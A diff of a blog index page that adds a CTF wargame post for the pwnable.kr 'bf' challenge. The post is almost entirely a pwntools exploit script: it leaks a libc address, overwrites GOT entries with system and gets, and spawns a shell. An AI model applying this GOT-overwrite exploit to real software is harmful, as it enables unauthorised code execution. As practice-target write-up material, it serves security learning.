@@ -150,7 +150,7 @@
                 
                 <section class="switch-part switch-part2">
                     <div class="widget tagcloud" id="js-tagcloud">
-                        <a href="/tags/ARM/" style="font-size: 10px;">ARM</a> <a href="/tags/AWD/" style="font-size: 10px;">AWD</a> <a href="/tags/Writeup/" style="font-size: 10px;">Writeup</a> <a href="/tags/arm/" style="font-size: 10px;">arm</a> <a href="/tags/awd/" style="font-size: 10px;">awd</a> <a href="/tags/bctf/" style="font-size: 10px;">bctf</a> <a href="/tags/bin/" style="font-size: 12px;">bin</a> <a href="/tags/code/" style="font-size: 14px;">code</a> <a href="/tags/crypto/" style="font-size: 10px;">crypto</a> <a href="/tags/ctf/" style="font-size: 16px;">ctf</a> <a href="/tags/cve/" style="font-size: 10px;">cve</a> <a href="/tags/fmt/" style="font-size: 10px;">fmt</a> <a href="/tags/heap/" style="font-size: 10px;">heap</a> <a href="/tags/heap-overflow/" style="font-size: 14px;">heap overflow</a> <a href="/tags/note/" style="font-size: 10px;">note</a> <a href="/tags/office/" style="font-size: 10px;">office</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a> <a href="/tags/pwntools/" style="font-size: 10px;">pwntools</a> <a href="/tags/python/" style="font-size: 14px;">python</a> <a href="/tags/wargame/" style="font-size: 10px;">wargame</a> <a href="/tags/web/" style="font-size: 18px;">web</a> <a href="/tags/writeup/" style="font-size: 16px;">writeup</a>
+                        <a href="/tags/ARM/" style="font-size: 10px;">ARM</a> <a href="/tags/AWD/" style="font-size: 10px;">AWD</a> <a href="/tags/Writeup/" style="font-size: 10px;">Writeup</a> <a href="/tags/arm/" style="font-size: 10px;">arm</a> <a href="/tags/awd/" style="font-size: 10px;">awd</a> <a href="/tags/bctf/" style="font-size: 10px;">bctf</a> <a href="/tags/bin/" style="font-size: 12px;">bin</a> <a href="/tags/code/" style="font-size: 14px;">code</a> <a href="/tags/crypto/" style="font-size: 10px;">crypto</a> <a href="/tags/ctf/" style="font-size: 16px;">ctf</a> <a href="/tags/cve/" style="font-size: 10px;">cve</a> <a href="/tags/fmt/" style="font-size: 10px;">fmt</a> <a href="/tags/heap/" style="font-size: 10px;">heap</a> <a href="/tags/heap-overflow/" style="font-size: 14px;">heap overflow</a> <a href="/tags/note/" style="font-size: 10px;">note</a> <a href="/tags/office/" style="font-size: 10px;">office</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a> <a href="/tags/pwntools/" style="font-size: 10px;">pwntools</a> <a href="/tags/python/" style="font-size: 14px;">python</a> <a href="/tags/wargame/" style="font-size: 10px;">wargame</a> <a href="/tags/web/" style="font-size: 18px;">web</a> <a href="/tags/writeup/" style="font-size: 16px;">writeup</a> <a href="/tags/日语/" style="font-size: 10px;">日语</a>
                     </div>
                 </section>
                 
@@ -237,6 +237,65 @@
     </div>
 </nav>
       <div class="body-wrap">
+  
+    <article id="post-wargame-pwnable-bf" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2016/06/08/wargame-pwnable-bf/" class="article-date">
+      <time datetime="2016-06-08T22:40:00.000Z" itemprop="datePublished">2016-06-08</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/06/08/wargame-pwnable-bf/">[wargame-pwnable] bf</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>got表的姿势</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">context(log_level=<span class="string">"debug"</span>)</div><div class="line"><span class="comment"># p = process('./bf')</span></div><div class="line">p = remote(<span class="string">'pwnable.kr'</span>,<span class="number">9001</span>)</div><div class="line">elf = ELF(<span class="string">'bf'</span>)</div><div class="line"><span class="comment">#readelf -s bf_libc.so |grep system</span></div><div class="line">libc_system_addr = <span class="number">0x0003f250</span></div><div class="line">libc_setvbuf_addr = <span class="number">0x00067f70</span></div><div class="line">libc_gets_addr = <span class="number">0x00066e50</span></div><div class="line">p_addr = <span class="number">0x0804A0A0</span></div><div class="line">vul_addr = <span class="number">0x08048671</span></div><div class="line">putchar_got = elf.got[<span class="string">'putchar'</span>]</div><div class="line">setvbuf_got = elf.got[<span class="string">'setvbuf'</span>]</div><div class="line">memset_got =  elf.got[<span class="string">'memset'</span>]</div><div class="line">fgets_got  = elf.got[<span class="string">'fgets'</span>]</div><div class="line"></div><div class="line">payload  = <span class="string">''</span></div><div class="line">payload += <span class="string">'&lt;'</span>*(p_addr-setvbuf_got) <span class="comment"># point to setvbuf_got</span></div><div class="line">payload += <span class="string">'.'</span>+<span class="string">'&gt;'</span>+<span class="string">'.'</span>+<span class="string">'&gt;'</span>+<span class="string">'.'</span>+<span class="string">'&gt;'</span>+<span class="string">'.'</span>+<span class="string">'&gt;'</span>+ <span class="string">'&lt;'</span>*<span class="number">4</span> <span class="comment">#leak setvbuf()</span></div><div class="line">payload += <span class="string">'&gt;'</span>*(putchar_got-setvbuf_got)<span class="comment">#point to putchar_got</span></div><div class="line">payload += <span class="string">','</span>+<span class="string">'&gt;'</span>+<span class="string">','</span>+<span class="string">'&gt;'</span>+<span class="string">','</span>+<span class="string">'&gt;'</span>+<span class="string">','</span>+<span class="string">'&gt;'</span>+<span class="string">'&lt;'</span>*<span class="number">4</span> <span class="comment">#change putchar() to vul_addr</span></div><div class="line">payload += <span class="string">'&lt;'</span>*(putchar_got-memset_got)<span class="comment">#point to memset_got</span></div><div class="line">payload += <span class="string">','</span>+<span class="string">'&gt;'</span>+<span class="string">','</span>+<span class="string">'&gt;'</span>+<span class="string">','</span>+<span class="string">'&gt;'</span>+<span class="string">','</span>+<span class="string">'&gt;'</span>+<span class="string">'&lt;'</span>*<span class="number">4</span> <span class="comment">#change memset() to gets()</span></div><div class="line">payload += <span class="string">'&lt;'</span>*(memset_got-fgets_got)<span class="comment">#point to fgets_got</span></div><div class="line">payload += <span class="string">','</span>+<span class="string">'&gt;'</span>+<span class="string">','</span>+<span class="string">'&gt;'</span>+<span class="string">','</span>+<span class="string">'&gt;'</span>+<span class="string">','</span>+<span class="string">'&gt;'</span>+<span class="string">'&lt;'</span>*<span class="number">4</span> <span class="comment">#change fgets() to gets()</span></div><div class="line">payload +=<span class="string">'.'</span></div><div class="line"><span class="keyword">print</span> <span class="string">'length = '</span>+hex(len(payload))</div><div class="line"><span class="comment"># gdb.attach(p,'b*0x804865A\nb*0x8048648\nc')</span></div><div class="line">p.recvuntil(<span class="string">'pt [ ]\n'</span>)</div><div class="line">p.sendline(payload)</div><div class="line">leak = p.recv(<span class="number">1</span>)+p.recv(<span class="number">1</span>)+p.recv(<span class="number">1</span>)+p.recv(<span class="number">1</span>)</div><div class="line">leak_setvbuf = u32(leak)</div><div class="line"><span class="keyword">print</span> <span class="string">'putchar_got_addr = '</span>+hex(putchar_got)</div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">'leak_setvbuf = '</span>+hex(leak_setvbuf)</div><div class="line"></div><div class="line">system_addr = leak_setvbuf - (libc_setvbuf_addr-libc_system_addr)</div><div class="line">gets_addr = leak_setvbuf - (libc_setvbuf_addr-libc_gets_addr)</div><div class="line"><span class="keyword">print</span> <span class="string">'system_addr = '</span> + hex(system_addr) </div><div class="line"><span class="keyword">print</span> <span class="string">'gets_addr = '</span>+hex(gets_addr)</div><div class="line"><span class="keyword">print</span> <span class="string">'###change putchar to  vul_addr'</span></div><div class="line">p.send(p32(vul_addr))</div><div class="line"><span class="keyword">print</span> <span class="string">'###change memset to  gets'</span></div><div class="line">p.send(p32(gets_addr))</div><div class="line"><span class="keyword">print</span> <span class="string">'###change fgets to system'</span></div><div class="line">p.send(p32(system_addr))</div><div class="line"><span class="keyword">print</span> <span class="string">"###send '/bin/sh'"</span></div><div class="line">p.sendline(<span class="string">'/bin/sh\0'</span>)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
+      
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wargame/">wargame</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
   
     <article id="post-2015-问鼎杯线下PWN" class="article article-type-post" itemscope itemprop="blogPost">
   
